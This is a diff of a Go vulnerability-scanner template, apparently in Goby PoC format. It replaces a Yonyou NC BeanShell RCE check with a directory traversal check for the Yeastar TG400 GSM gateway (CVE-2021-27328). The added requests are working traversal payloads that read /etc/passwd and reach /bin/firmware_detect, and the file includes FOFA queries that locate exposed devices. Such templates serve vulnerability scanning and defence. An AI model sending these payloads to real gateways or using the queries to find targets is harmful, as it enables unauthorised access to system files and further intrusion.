@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "朗视 TG400 GSM 网关目录遍历 CVE-2021-27328",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"Yeastar-TG400\" || product=\"Yeastar-TG400\"",
+  "GobyQuery": "app=\"Yeastar-TG400\" || product=\"Yeastar-TG400\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "root:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "pass",
             "bz": ""
           }
         ]
@@ -107,7 +138,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "朗视 TG400 GSM 网关目录遍历 CVE-2021-27328",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +147,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Yeastar TG400 GSM dir list CVE-2021-27328",
       "Product": "",
       "Description": "",
       "Recommendation": "",
